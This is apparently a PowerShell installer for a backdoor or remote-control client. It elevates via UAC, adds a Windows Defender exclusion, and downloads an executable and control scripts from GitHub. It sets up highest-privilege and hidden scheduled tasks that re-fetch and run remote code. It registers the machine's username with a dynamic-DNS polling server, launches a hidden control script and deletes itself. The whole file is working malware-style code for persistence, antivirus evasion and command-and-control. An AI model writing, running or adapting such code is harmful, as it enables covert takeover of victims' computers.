$ErrorActionPreference = "Continue"

function Log($text) {
  Write-Host $text
}

Log "01 Starting installer"
$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
Log "02 VPS poll URL configured"

$self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
$runDir = "$env:APPDATA\run"
$runExe = "$runDir\run.exe"
$installDir = "$env:TEMP\run"
$installer = "$installDir\ss_installer.ps1"
$ssControl = "$installDir\ss_control.ps1"
$datDir = "$env:APPDATA\Microsoft\run"
$datFile = "$datDir\run.dat"

Log "03 Paths configured"
Log "04 Installer path: $installer"
Log "05 Run path: $runExe"

$isUpdate = Test-Path $datFile
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

Log "06 Existing installation: $isUpdate"
Log "07 Administrator: $isAdmin"

if (-not $isUpdate -and -not $isAdmin) {
  Log "08 Fresh install requires administrator privileges"
  Log "09 Requesting UAC"
  Start-Process -FilePath $self -Verb RunAs
  Log "10 UAC process started"
  Read-Host "Press Enter to close"
  exit
}

if (-not $isUpdate) {
  Log "11 Adding Defender exclusion"
  Add-MpPreference -ExclusionPath $runDir | Out-Null
  Log "12 Defender exclusion operation finished"
}
else {
  Log "11 Existing installation detected, skipping Defender exclusion"
}

if (-not (Test-Path $datDir)) {
  Log "13 Creating data directory"
  New-Item -ItemType Directory -Path $datDir -Force | Out-Null
}
else {
  Log "13 Data directory already exists"
}

Log "14 Creating TEMP directory"
New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null

Log "15 Creating installer directory"
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Log "16 Stopping existing run process"
Get-Process -Name "run" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

if (Get-Process -Name "run" -ErrorAction SilentlyContinue) {
  Log "16 ERROR: run process is still running"
}
else {
  Log "16 Existing run process stopped"
}

Log "17 Creating run directory"
New-Item -ItemType Directory -Path $runDir -Force | Out-Null

Log "18 Checking latest GitHub commit"
try {
  $apiResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" -UseBasicParsing -ErrorAction Stop
  $latestCommit = $apiResponse.sha
  Log "19 Latest commit: $latestCommit"
}
catch {
  $latestCommit = "main"
  Log "19 Failed to get latest commit, using main"
}

Log "20 Downloading run.exe"
try {
  Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/run.exe" -OutFile $runExe -UseBasicParsing -ErrorAction Stop
  Log "21 run.exe downloaded successfully"
}
catch {
  Log "21 ERROR: run.exe download failed"
  Log "22 Error: $($_.Exception.Message)"
  Read-Host "Press Enter to close"
  exit
}

Log "23 Downloading ss_installer.ps1"
try {
  Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_installer.ps1" -OutFile $installer -UseBasicParsing -ErrorAction Stop
  Log "24 ss_installer.ps1 downloaded successfully"
}
catch {
  Log "24 ERROR: ss_installer.ps1 download failed"
  Log "25 Error: $($_.Exception.Message)"
  Read-Host "Press Enter to close"
  exit
}

Log "25e Downloading ss_control.ps1"
try {
  Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_control.ps1" -OutFile $ssControl -UseBasicParsing -ErrorAction Stop
  Log "25f ss_control.ps1 downloaded successfully"
}
catch {
  Log "25g ERROR: ss_control.ps1 download failed"
  Log "25h Error: $($_.Exception.Message)"
  Read-Host "Press Enter to close"
  exit
}

if (-not (Test-Path $runExe) -or -not (Test-Path $installer) -or -not (Test-Path $ssControl)) {
  Log "26 ERROR: Required files are missing, exiting"
  Read-Host "Press Enter to close"
  exit
}
Log "27 Required files verified"

$taskName = "WinRun"
Log "28 Creating WinRun scheduled task action"
$action = New-ScheduledTaskAction -Execute $runExe -WorkingDirectory $runDir

Log "29 Creating WinRun logon trigger"
$trigger = New-ScheduledTaskTrigger -AtLogOn

Log "30 Creating WinRun settings"
$settings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Days 365)

$installerTaskName = "WinRunInstaller"
Log "31 Creating installer task command"
$cmd = 'powershell.exe -Command "$p="$env:APPDATA\run"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o="$p\installer.exe"; Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o; Start-Process $o"'

Log "32 Creating installer scheduled task action"
$installerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument " -Command $cmd"

Log "33 Creating installer task settings"
$installerSettings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
  -Hidden

Log "34 Registering WinRun scheduled task"
Register-ScheduledTask `
  -TaskName $taskName `
  -Action $action `
  -Trigger $trigger `
  -Settings $settings `
  -RunLevel Highest `
  -Force | Out-Null

Log "35 Registering WinRunInstaller scheduled task"
Register-ScheduledTask `
  -TaskName $installerTaskName `
  -Action $installerAction `
  -Settings $installerSettings `
  -RunLevel Highest `
  -Force | Out-Null

Log "36 Scheduled tasks registered"

Log "37 Running ss_installer.ps1"
Start-Process powershell.exe `
  -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$installer'" `
  -Wait
Log "38 ss_installer.ps1 finished"

Log "39 Saving installed commit"
$latestCommit | Out-File $datFile

if (Test-Path $datFile) {
  Log "40 Install marker saved"
}
else {
  Log "40 ERROR: Install marker was not saved"
}

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
Log "41 Checking client ID"

if (Test-Path $IdPath) {
  Log "42 Existing client ID found"
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
    Log "43 Client ID loaded"
  }
  else {
    $uniqueId = $raw
    Log "43 Short client ID loaded"
  }
}
else {
  Log "42 Client ID does not exist"
  Log "43 Generating new client ID"
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
  Log "44 Client ID saved"
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
Log "45 Client username: $uniqueUser"

try {
  Log "46 Registering client with VPS"
  $registerUrl = $VPS_POLL_URL + "?username=" + $uniqueUser
  Log "47 Registration URL: [$registerUrl]"

  $testUri = [System.Uri]$registerUrl
  Log "48 URI Host: [$($testUri.Host)]"
  Log "49 URI Path: [$($testUri.AbsolutePath)]"

  Invoke-RestMethod -Method Get -Uri $registerUrl -ErrorAction Stop | Out-Null
  Log "50 Client registration request succeeded"
}
catch {
  Log "51 ERROR: Client registration request failed"
  Log "52 Error: $($_.Exception.Message)"
}

Log "53 Starting run.exe"
Start-Process $runExe
Log "54 run.exe start command sent"

Log "55 Starting ss_control.ps1"
Start-Process powershell.exe `
  -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$ssControl'" `
  -WindowStyle Hidden
Log "56 ss_control.ps1 started in background"

Read-Host "Press Enter to close"

if ($installer) {
  Log "57 Scheduling installer cleanup"
  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
}

if ($self) {
  Log "58 Scheduling installer self cleanup"
  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 4; Remove-Item '$self' -Force`"" -WindowStyle Hidden
}

Log "59 Installation process finished"
